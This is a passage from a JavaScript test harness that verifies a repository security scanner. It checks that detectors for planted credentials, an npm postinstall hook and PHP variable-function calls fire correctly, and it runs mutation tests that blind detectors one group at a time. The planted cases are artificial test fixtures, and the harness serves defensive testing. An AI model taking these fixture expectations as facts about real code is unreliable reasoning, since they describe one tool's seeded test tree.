  const quiet = (R, w) => fOf(R).filter((f) => f.where === w && !['D-ORPHAN', 'D-DUPLICATE'].includes(f.detector))
  for (const c of CONTROLS) check(quiet(R1, c).length === 0, `verify: negative control stays quiet: ${c}`, quiet(R1, c).map((f) => f.detector).join(','))
  const before = new Set(fOf(B0).map(keyV))
  const fresh = fOf(R1).filter((f) => !before.has(keyV(f)))
  const stray = fresh.filter((f) => !planted.some((p) => f.where === p || f.where.startsWith(p)) && !['D-DUPLICATE', 'D-LARGE', 'D-CASE-COLLIDE', 'S-TEST-CRED'].includes(f.detector))
  check(stray.length === 0, `verify: nothing else is newly flagged (${fresh.length} new findings, all on planted files)`, stray.slice(0, 5).map(keyV).join('; '))
  check(![PASS24, TOK, RANDOM35, NPM, SG, TG, DOK].some((v) => R1.text.includes(v)), 'verify: no planted secret value appears in the JSON')
  const unb = fOf(R1).find((f) => f.detector === 'D-CONFIG-EXEC' && f.where === 'sporta-web/package.json')
  check(!!unb && /postinstall/.test(unb.evidence), 'verify: the npm install hook is named in the finding', unb?.evidence)

  // --- mutations: blind the detectors (and the two judging rules); only the checks that depend on them may fail
  const dets = [...new Set(CHECKS.map((c) => c[0]))].filter((d) => !['S-NAMED', 'D-PHP-VARFUNC'].includes(d))
  const groups = [0, 1].map((m) => dets.filter((_, i) => i % 2 === m))
  for (const [gi, grp] of groups.entries()) {
    const R = scanV(ROOT, { UFS_BLIND: grp.join(',') })
    if (!R.json) { bad(`verify: mutation group ${gi + 1} runs`, R.stderr.slice(0, 200)); continue }
    const wrong = []
    for (const [det, where] of CHECKS) {
      const found = hasV(R, det, where)
      if (grp.includes(det) && found) wrong.push(`${det} still reported at ${where.replace(/[^\x20-\x7e]/g, '?')}`)
      if (!grp.includes(det) && !found && hasV(R1, det, where)) wrong.push(`${det} at ${where.replace(/[^\x20-\x7e]/g, '?')} lost without being blinded`)
    }
    check(wrong.length === 0, `verify: mutation: blinding ${grp.length} detectors (${grp.slice(0, 4).join(', ')}${grp.length > 4 ? ', ...' : ''}) fails exactly their checks`, wrong.slice(0, 3).join('; '))
  }
  const RV = scanV(ROOT, { UFS_BLIND: 'D-PHP-VARFUNC' })
  check(RV.json && !hasV(RV, 'D-PHP-VARFUNC', D + 'v-paren.php') && !hasV(RV, 'D-PHP-VARFUNC', D + 'v-input-fn.php') && hasV(RV, 'D-PHP-CALLBACK-REQ', D + 'v-usort.php'), 'verify: mutation: blinding D-PHP-VARFUNC loses the three variable-function shapes and nothing else')
  const RN = scanV(ROOT, { UFS_BLIND: 'S-NAMED' })
  check(RN.json && !hasV(RN, 'S-NAMED', S + 'zz5.mjs') && !hasV(RN, 'S-NAMED', L + 's-random.js') && hasV(RN, 'S-NPM', L + 's-npm.js'), 'verify: mutation: blinding S-NAMED loses the named-credential checks and nothing else')
  const RT = scanV(ROOT, { UFS_BLIND: 'J-TESTZONE' })
  check(RT.json && !hasV(RT, 'S-NAMED', S + 'zz5.mjs') && !hasV(RT, 'S-NAMED', 'sporta-web/ops/zz-job.json') && hasV(RT, 'S-NAMED', L + 's-random.js'), 'verify: mutation: without the test-zone rule a pasted 24-character password in scripts/ is a "test credential" again')
  const RJ = scanV(ROOT, { UFS_BLIND: 'J-VARNAME' })
  check(RJ.json && hasV(RJ, 'S-NAMED', L + 's-placeholder.js'), 'verify: mutation: without the variable-name rule "the-value-of-ALMUHALLAB_LEAD_SECRET" is a "real" secret again (the history scan\'s one false alarm)')
}

// ---------------------------------------------------------------- main
if (wanted === 'all' || wanted === 'repo') await repoSection()
if (wanted === 'all' || wanted === 'verify') await verifySection()
if (wanted === 'all' || wanted === 'live') {
  await liveSection()
  // the mutation harness reuses the docroots the live section left in TMP
  const m = gen.buildManifest('HEAD')
  const manifest = JSON.parse(gen.manifestJson(m))
  await mutations(path.join(TMP, 'clean'), path.join(TMP, 'planted'), manifest)
}
console.log(`\n${fails ? `${fails} FAIL` : 'all ok'} — ${passes} checks passed${skipped.length ? `; skipped: ${skipped.join('; ')}` : ''}`)
process.exit(fails ? 1 : 0)
